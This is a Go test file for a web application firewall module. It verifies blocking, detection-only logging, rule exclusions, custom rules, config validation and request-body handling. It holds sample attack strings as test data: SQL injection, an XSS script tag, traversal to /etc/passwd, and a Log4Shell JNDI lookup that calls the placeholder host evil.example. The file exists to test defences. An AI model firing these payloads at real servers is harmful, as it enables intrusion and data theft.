package waf

import (
	"bytes"
	"crypto/rand"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"
)

// newTestHandler returns a handler that inspects the request and, if not
// blocked, echoes the body length and a hash-able copy of the body.
func newTestHandler(t testing.TB, cfg *Config) (http.Handler, *Manager) {
	t.Helper()
	m := NewManager()
	in, err := m.Get(cfg)
	if err != nil {
		t.Fatalf("build waf: %v", err)
	}
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if in != nil && in.Inspect(w, r, RequestInfo{Endpoint: "test", ClientIP: "203.0.113.7"}) {
			return
		}
		b, _ := io.ReadAll(r.Body)
		w.WriteHeader(200)
		w.Write(b)
	}), m
}

func stdHeaders(req *http.Request) {
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Host = "example.com"
}

func do(h http.Handler, method, target string, body []byte, hdr map[string]string) *httptest.ResponseRecorder {
	var rd io.Reader
	if body != nil {
		rd = bytes.NewReader(body)
	}
	req := httptest.NewRequest(method, target, rd)
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/json;q=0.9,*/*;q=0.8")
	req.Host = "example.com"
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

type attack struct {
	name   string
	target string
	hdr    map[string]string
}

var attacks = []attack{
	{"sqli", "/item?id=1%27%20OR%20%271%27%3D%271", nil},
	{"xss", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", nil},
	{"traversal", "/download?file=../../../../etc/passwd", nil},
	{"log4shell", "/", map[string]string{"X-Api-Version": "${jndi:ldap://evil.example/a}"}},
	{"scanner-ua", "/", map[string]string{"User-Agent": "sqlmap/1.7"}},
}

func TestBlockMode(t *testing.T) {
	h, m := newTestHandler(t, &Config{Mode: ModeBlock})
	for _, a := range attacks {
		rec := do(h, "GET", a.target, nil, a.hdr)
		if rec.Code != 403 {
			t.Errorf("%s: expected 403, got %d", a.name, rec.Code)
		}
	}
	evs := m.RecentEvents(100, "")
	if len(evs) != len(attacks) {
		t.Fatalf("expected %d events, got %d", len(attacks), len(evs))
	}
	for _, e := range evs {
		if e.Action != "blocked" || len(e.Rules) == 0 || e.TransactionID == "" {
			t.Errorf("bad event: %+v", e)
		}
	}
	st := m.Stats()
	if st.Blocked != uint64(len(attacks)) || st.PerEndpoint["test"] != uint64(len(attacks)) || len(st.PerRule) == 0 {
		t.Errorf("bad stats: %+v", st)
	}
}

func TestDetectionOnlyDoesNotBlock(t *testing.T) {
	h, m := newTestHandler(t, &Config{Mode: ModeDetectionOnly})
	for _, a := range attacks {
		rec := do(h, "GET", a.target, nil, a.hdr)
		if rec.Code != 200 {
			t.Errorf("%s: detection_only must pass, got %d", a.name, rec.Code)
		}
	}
	evs := m.RecentEvents(100, "")
	if len(evs) != len(attacks) {
		t.Fatalf("expected %d logged events, got %d", len(attacks), len(evs))
	}
	for _, e := range evs {
		if e.Action != "detected" || !e.WouldBlock {
			t.Errorf("expected detected+would_block: %+v", e)
		}
	}
}

func TestOffPassesEverything(t *testing.T) {
	for _, cfg := range []*Config{nil, {Mode: ModeOff}, {}} {
		h, m := newTestHandler(t, cfg)
		for _, a := range attacks {
			if rec := do(h, "GET", a.target, nil, a.hdr); rec.Code != 200 {
				t.Errorf("%s: off mode must pass, got %d", a.name, rec.Code)
			}
		}
		if len(m.RecentEvents(10, "")) != 0 {
			t.Error("off mode must not log")
		}
	}
}

func TestCleanRequestsPass(t *testing.T) {
	h, m := newTestHandler(t, &Config{Mode: ModeBlock})
	cases := []struct {
		method, target string
		body           string
		ct             string
	}{
		{"GET", "/", "", ""},
		{"GET", "/static/app.js?v=20240101", "", ""},
		{"GET", "/search?q=hello+world&page=2", "", ""},
		{"POST", "/api/users", `{"name":"Alice","email":"alice@example.com","age":31,"tags":["a","b"]}`, "application/json"},
		{"PUT", "/api/items/5", `{"title":"Fish & chips","price":12.5,"note":"it's good"}`, "application/json"},
		{"POST", "/login", "username=bob&password=correct+horse+battery", "application/x-www-form-urlencoded"},
	}
	for _, c := range cases {
		hdr := map[string]string{}
		if c.ct != "" {
			hdr["Content-Type"] = c.ct
		}
		var body []byte
		if c.body != "" {
			body = []byte(c.body)
		}
		rec := do(h, c.method, c.target, body, hdr)
		if rec.Code != 200 {
			t.Errorf("%s %s: clean request blocked (%d): %+v", c.method, c.target, rec.Code, m.RecentEvents(1, ""))
		}
		if rec.Body.String() != c.body {
			t.Errorf("%s %s: body not replayed", c.method, c.target)
		}
	}
}

func TestBodyAttackAndReplay(t *testing.T) {
	h, _ := newTestHandler(t, &Config{Mode: ModeBlock})
	rec := do(h, "POST", "/api", []byte(`{"q":"1' OR '1'='1"}`), map[string]string{"Content-Type": "application/json"})
	if rec.Code != 403 {
		t.Errorf("SQLi in JSON body should be blocked, got %d", rec.Code)
	}
	rec = do(h, "POST", "/c", []byte("comment=<script>alert(1)</script>"), map[string]string{"Content-Type": "application/x-www-form-urlencoded"})
	if rec.Code != 403 {
		t.Errorf("XSS in form body should be blocked, got %d", rec.Code)
	}
}

func TestBodyReplayIdenticalBytes(t *testing.T) {
	h, _ := newTestHandler(t, &Config{Mode: ModeBlock})
	// binary payload within the limit, chunked (unknown length) and known length
	payload := make([]byte, 50*1024)
	rand.Read(payload)
	for _, chunked := range []bool{false, true} {
		req := httptest.NewRequest("POST", "/upload", io.NopCloser(bytes.NewReader(payload)))
		if !chunked {
			req.ContentLength = int64(len(payload))
		} else {
			req.ContentLength = -1
			req.TransferEncoding = []string{"chunked"}
		}
		req.Header.Set("Content-Type", "application/octet-stream")
		stdHeaders(req)
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		if rec.Code == 403 {
			t.Skip("random binary tripped a rule; replay test inconclusive")
		}
		if !bytes.Equal(rec.Body.Bytes(), payload) {
			t.Errorf("chunked=%v: upstream did not receive identical bytes", chunked)
		}
	}
}

func TestLargeBodyPassthrough(t *testing.T) {
	h, m := newTestHandler(t, &Config{Mode: ModeBlock, MaxBodyBytes: 1024})
	// attack string inside a body larger than the limit is NOT inspected
	big := append([]byte("q=1' OR '1'='1&pad="), bytes.Repeat([]byte("a"), 8192)...)
	for _, cl := range []int64{int64(len(big)), -1} {
		req := httptest.NewRequest("POST", "/upload", io.NopCloser(bytes.NewReader(big)))
		req.ContentLength = cl
		if cl < 0 {
			req.TransferEncoding = []string{"chunked"}
		} else {
			req.Header.Set("Content-Length", itoa(int(cl)))
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		stdHeaders(req)
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		if rec.Code != 200 || !bytes.Equal(rec.Body.Bytes(), big) {
			t.Errorf("cl=%d: large body must pass through intact, code=%d len=%d", cl, rec.Code, rec.Body.Len())
		}
	}
	if evs := m.RecentEvents(10, ""); len(evs) != 0 {
		t.Errorf("over-limit body must not be inspected: %+v", evs)
	}
}

// A body that never ends must not be fully buffered: the handler must be
// able to start reading it after at most limit+1 bytes were consumed.
func TestStreamingBodyNotFullyBuffered(t *testing.T) {
	m := NewManager()
	in, err := m.Get(&Config{Mode: ModeBlock, MaxBodyBytes: 1024})
	if err != nil {
		t.Fatal(err)
	}
	pr, pw := io.Pipe()
	req := httptest.NewRequest("POST", "/stream", pr)
	req.ContentLength = -1
	req.TransferEncoding = []string{"chunked"}
	req.Header.Set("Content-Type", "application/octet-stream")
	stdHeaders(req)
	go func() {
		pw.Write(bytes.Repeat([]byte("x"), 2048)) // more than the limit, then stall
	}()
	done := make(chan bool)
	go func() {
		blocked := in.Inspect(httptest.NewRecorder(), req, RequestInfo{Endpoint: "s"})
		done <- blocked
	}()
	select {
	case blocked := <-done:
		if blocked {
			t.Error("stream must not be blocked")
		}
	case <-time.After(5 * time.Second):
		t.Fatal("Inspect waited for the whole stream")
	}
	rest := make([]byte, 2048)
	if _, err := io.ReadFull(req.Body, rest); err != nil {
		t.Errorf("stream replay lost bytes: %v", err)
	}
	pw.Close()
}

func TestGRPCAndWebSocketPassthrough(t *testing.T) {
	h, m := newTestHandler(t, &Config{Mode: ModeBlock})
	// gRPC: attack-looking content, must be untouched
	body := []byte("\x00\x00\x00\x00\x10' OR '1'='1' --")
	rec := do(h, "POST", "/pkg.Service/Method?x=<script>", body, map[string]string{"Content-Type": "application/grpc", "TE": "trailers"})
	if rec.Code != 200 || !bytes.Equal(rec.Body.Bytes(), body) {
		t.Errorf("grpc must pass through, got %d", rec.Code)
	}
	rec = do(h, "POST", "/x", body, map[string]string{"Content-Type": "application/grpc+proto"})
	if rec.Code != 200 {
		t.Errorf("grpc+proto must pass through, got %d", rec.Code)
	}
	rec = do(h, "GET", "/ws?x=<script>", nil, map[string]string{"Upgrade": "websocket", "Connection": "Upgrade", "Sec-WebSocket-Key": "x", "Sec-WebSocket-Version": "13"})
	if rec.Code != 200 {
		t.Errorf("websocket upgrade must pass through, got %d", rec.Code)
	}
	if len(m.RecentEvents(10, "")) != 0 {
		t.Error("bypassed requests must not be logged")
	}
}

func TestExclusions(t *testing.T) {
	// find which rules fire for the attack first
	_, m := newTestHandler(t, &Config{Mode: ModeBlock})
	h0, _ := newTestHandler(t, &Config{Mode: ModeBlock})
	_ = m
	target := "/admin/query?q=1%27%20OR%20%271%27%3D%271"
	if do(h0, "GET", target, nil, nil).Code != 403 {
		t.Fatal("baseline must be blocked")
	}
	h1, m1 := newTestHandler(t, &Config{Mode: ModeDetectionOnly})
	do(h1, "GET", target, nil, nil)
	var ids []string
	for _, r := range m1.RecentEvents(1, "")[0].Rules {
		if r.ID != anomalyEvaluationRuleID && r.ID >= 900000 {
			ids = append(ids, itoa(r.ID))
		}
	}
	if len(ids) == 0 {
		t.Fatal("no rule ids")
	}

	// path scoped exclusion: only /admin/ is excluded
	h, _ := newTestHandler(t, &Config{Mode: ModeBlock, PathExclusions: []PathExclusion{{Path: "/admin/", RuleIDs: ids}}})
	if c := do(h, "GET", target, nil, nil).Code; c != 200 {
		t.Errorf("excluded path should pass, got %d", c)
	}
	if c := do(h, "GET", "/other/query?q=1%27%20OR%20%271%27%3D%271", nil, nil).Code; c != 403 {
		t.Errorf("non-excluded path should still block, got %d", c)
	}
	// exact path exclusion
	h, _ = newTestHandler(t, &Config{Mode: ModeBlock, PathExclusions: []PathExclusion{{Path: "/admin/query", Exact: true, RuleIDs: ids}}})
	if c := do(h, "GET", target, nil, nil).Code; c != 200 {
		t.Errorf("exact exclusion should pass, got %d", c)
	}
	if c := do(h, "GET", "/admin/query2?q=1%27%20OR%20%271%27%3D%271", nil, nil).Code; c != 403 {
		t.Errorf("exact exclusion must not match other path, got %d", c)
	}
	// endpoint wide exclusion
	h, _ = newTestHandler(t, &Config{Mode: ModeBlock, ExcludedRuleIDs: ids})
	if c := do(h, "GET", target, nil, nil).Code; c != 200 {
		t.Errorf("endpoint wide exclusion should pass, got %d", c)
	}
}

func TestCustomRules(t *testing.T) {
	rules := `SecRule REQUEST_HEADERS:X-Evil "@streq yes" "id:1000001,phase:1,deny,status:403,msg:'custom evil header',log"`
	h, m := newTestHandler(t, &Config{Mode: ModeBlock, CustomRules: rules})
	if c := do(h, "GET", "/", nil, map[string]string{"X-Evil": "yes"}).Code; c != 403 {
		t.Errorf("custom rule should block, got %d", c)
	}
	if c := do(h, "GET", "/", nil, nil).Code; c != 200 {
		t.Errorf("clean request should pass, got %d", c)
	}
	if ev := m.RecentEvents(1, ""); len(ev) != 1 || ev[0].Rules[0].ID != 1000001 {
		t.Errorf("custom rule hit not logged: %+v", ev)
	}
}

func TestInvalidConfigRejected(t *testing.T) {
	m := NewManager()
	bad := []Config{
		{Mode: ModeBlock, CustomRules: `SecRule REQUEST_URI "@rx (" "id:1000002,phase:1,deny"`},
		{Mode: ModeBlock, CustomRules: `SecRule THIS_IS_NOT_A_VARIABLE "x" "id:1000003,phase:1,deny"`},
		{Mode: ModeBlock, CustomRules: `NotADirective foo bar`},
		{Mode: ModeBlock, CustomRules: `Include /etc/passwd`},
		{Mode: ModeBlock, CustomRules: `SecAuditLog /tmp/x`},
		{Mode: ModeBlock, CustomRules: `SecRule REQUEST_URI "@pmFromFile /etc/passwd" "id:1000004,phase:1,deny"`},
		{Mode: ModeBlock, ParanoiaLevel: 9},
		{Mode: "bogus"},
		{Mode: ModeBlock, ExcludedRuleIDs: []string{"abc"}},
		{Mode: ModeBlock, PathExclusions: []PathExclusion{{Path: `x"y`, RuleIDs: []string{"1"}}}},
		{Mode: ModeBlock, CustomRules: `SecRule REQUEST_URI "@rx a" "id:1000005,phase:1,deny"` + "\n" + `SecRule REQUEST_URI "@rx b" "id:1000005,phase:1,deny"`},
	}
	for i, c := range bad {
		c := c
		if _, err := m.Get(&c); err == nil {
			t.Errorf("case %d should have been rejected: %+v", i, c)
		}
	}
}

func TestParanoiaLevelAndThreshold(t *testing.T) {
	// A very high threshold means nothing blocks even though rules match
	h, m := newTestHandler(t, &Config{Mode: ModeBlock, InboundThreshold: 10000})
	if c := do(h, "GET", attacks[0].target, nil, nil).Code; c != 200 {
		t.Errorf("huge threshold should not block, got %d", c)
	}
	if len(m.RecentEvents(1, "")) != 1 {
		t.Error("matches should still be logged below threshold")
	}
	for pl := 1; pl <= 4; pl++ {
		h, _ := newTestHandler(t, &Config{Mode: ModeBlock, ParanoiaLevel: pl})
		if c := do(h, "GET", attacks[0].target, nil, nil).Code; c != 403 {
			t.Errorf("PL%d should block sqli, got %d", pl, c)
		}
	}
}

func TestInstanceCacheSharing(t *testing.T) {
	m := NewManager()
	a, _ := m.Get(&Config{Mode: ModeBlock})
	b, _ := m.Get(&Config{Mode: ModeBlock, ParanoiaLevel: 1, InboundThreshold: 5})
	c, _ := m.Get(&Config{Mode: ModeDetectionOnly})
	if a == nil || a != b {
		t.Error("identical effective configs must share one instance")
	}
	if c == a {
		t.Error("different configs must not share")
	}
}

func TestConcurrent(t *testing.T) {
	h, _ := newTestHandler(t, &Config{Mode: ModeBlock})
	var wg sync.WaitGroup
	for i := 0; i < 16; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			for j := 0; j < 10; j++ {
				a := attacks[(i+j)%len(attacks)]
				if c := do(h, "GET", a.target, nil, a.hdr).Code; c != 403 {
					t.Errorf("concurrent %s got %d", a.name, c)
				}
				if c := do(h, "POST", "/api", []byte(`{"a":1}`), map[string]string{"Content-Type": "application/json"}).Code; c != 200 {
					t.Errorf("concurrent clean got %d", c)
				}
			}
		}(i)
	}
	wg.Wait()
}

type captureSink struct {
	mu    sync.Mutex
	lines []string
}

func (c *captureSink) LogRaw(l string) { c.mu.Lock(); c.lines = append(c.lines, l); c.mu.Unlock() }

func TestAuditSinkJSONLines(t *testing.T) {
	m := NewManager()
	sink := &captureSink{}
	m.SetAuditSink(sink)
	in, err := m.Get(&Config{Mode: ModeBlock})
	if err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest("GET", attacks[0].target, nil)
	req.Host = "example.com"
	in.Inspect(httptest.NewRecorder(), req, RequestInfo{Endpoint: "e", ClientIP: "1.2.3.4"})
	sink.mu.Lock()
	defer sink.mu.Unlock()
	if len(sink.lines) != 1 || !strings.HasPrefix(sink.lines[0], "{") || strings.Contains(sink.lines[0], "\n") ||
		!strings.Contains(sink.lines[0], `"client_ip":"1.2.3.4"`) {
		t.Errorf("bad audit lines: %v", sink.lines)
	}
}
